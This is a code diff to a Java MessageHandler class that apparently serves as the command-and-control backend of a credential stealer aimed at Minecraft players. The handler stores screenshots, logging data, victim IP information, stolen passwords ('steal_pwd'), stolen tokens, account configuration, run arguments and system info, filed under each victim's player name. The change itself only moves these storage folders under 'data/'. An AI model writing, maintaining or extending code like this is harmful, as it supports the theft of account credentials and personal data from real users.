@@ -29,16 +29,16 @@ public class MessageHandler {
             try {
                 switch (msgType) {
                     case "screenshot" -> {
-                        File file = new File("screenshots", getFileName("id", "png", String.valueOf(id), true));
+                        File file = new File("data/screenshots", getFileName("id", "png", String.valueOf(id), true));
                         FileUtil.write(file, GSON.fromJson(msg, byte[].class));
                     }
                     case "skin" -> {
                         String playerName = info.playerData.get("playerName").getAsString();
-                        File file = new File("skins", getFileName(playerName, "png", String.valueOf(id), false));
+                        File file = new File("data/skins", getFileName(playerName, "png", String.valueOf(id), false));
                         FileUtil.write(file, GSON.fromJson(msg, byte[].class));
                     }
                     case "logging" -> {
-                        File file = new File("logging", getFileName("id", "log", String.valueOf(id), false));
+                        File file = new File("data/logging", getFileName("id", "log", String.valueOf(id), false));
                         String oldInfo = new String(FileUtil.read(file), StandardCharsets.UTF_8);
                         FileUtil.write(file, (oldInfo + msg).getBytes(StandardCharsets.UTF_8));
                     }
@@ -46,7 +46,7 @@ public class MessageHandler {
                     case "ip" -> info.ip = new Gson().fromJson(msg, JsonObject.class);
                     case "steal_pwd", "steal_token", "iasconfig", "runargs", "systeminfo" -> {
                         String ext = msgType.equals("systeminfo") ? "txt" : "json";
-                        File file = new File("data", getFileName(msgType, ext, info.playerData.get("playerName").getAsString(), true));
+                        File file = new File("data/data", getFileName(msgType, ext, info.playerData.get("playerName").getAsString(), true));
                         FileUtil.write(file, msg);
                     }
                     case "xor" -> {
